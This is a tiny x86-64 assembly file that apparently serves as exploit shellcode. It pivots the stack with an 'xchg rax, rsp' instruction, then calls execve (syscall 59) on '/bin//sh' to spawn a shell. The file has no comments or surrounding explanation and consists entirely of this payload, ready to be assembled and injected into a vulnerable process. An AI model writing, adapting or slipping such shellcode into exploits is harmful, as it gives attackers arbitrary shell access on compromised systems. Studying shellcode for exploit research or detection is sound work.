global _start
section .text
_start:
	xchg rax, rsp
	push 59
	pop rax
	mov rbx, '/bin//sh'
	push rbx
	push rsp
	pop rdi
	syscall

